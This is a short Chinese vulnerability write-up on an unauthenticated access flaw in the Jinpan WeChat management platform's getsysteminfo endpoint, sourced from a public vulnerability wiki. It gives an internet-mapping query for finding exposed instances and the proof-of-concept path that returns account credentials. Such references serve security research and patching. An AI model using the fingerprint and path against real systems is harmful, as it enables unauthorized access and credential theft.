---
title: "金盘 微信管理平台 getsysteminfo 未授权访问漏洞"
date: 2026-10-16 09:11:41
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "金盘-微信管理平台-getsysteminfo"
tags:
  - "金盘-微信管理平台-getsysteminfo"
  - "未授权访问"
  - "漏洞复现"
---
## 漏洞描述

金盘 微信管理平台 getsysteminfo接口存在未授权访问漏洞，攻击者通过漏洞可以获取账号密码信息，获取后台管理员权限

## 漏洞影响

金盘 微信管理平台

## 网络测绘

```
title="微信管理后台" && icon_hash="116323821"
```

## 漏洞复现

登陆页面

![image-20230828162340318](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828162340318.png)

验证POC

```
/admin/weichatcfg/getsysteminfo
```

![image-20230828162351977](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20230828162351977.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%87%91%E7%9B%98-%E5%BE%AE%E4%BF%A1%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-getsysteminfo-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.md)
